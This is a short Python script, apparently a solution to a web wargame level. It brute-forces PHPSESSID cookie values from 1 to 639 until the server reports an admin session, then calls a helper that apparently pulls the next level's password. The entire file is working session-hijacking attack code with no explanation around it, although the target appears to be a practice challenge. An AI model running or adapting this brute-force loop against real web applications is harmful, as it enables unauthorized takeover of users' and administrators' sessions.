import Auther


def predicate(phpSessionId: int):
    try:
        with Auther.request(18, data={"username": "foo",
                                      "password": "bar"},
                            cookies={"PHPSESSID": f"{phpSessionId}"}) as r:
            return r.text if "You are an admin" in r.text else None
    except:
        return predicate(phpSessionId)


for phpSessionId in range(1, 640):
    # 119
    print(f"Progress: {phpSessionId}/640")
    # print(r.text)
    if text := predicate(phpSessionId):
        print(f"Admin session id: {phpSessionId}")
        Auther.semicolonGetter(text, 19)()
        break
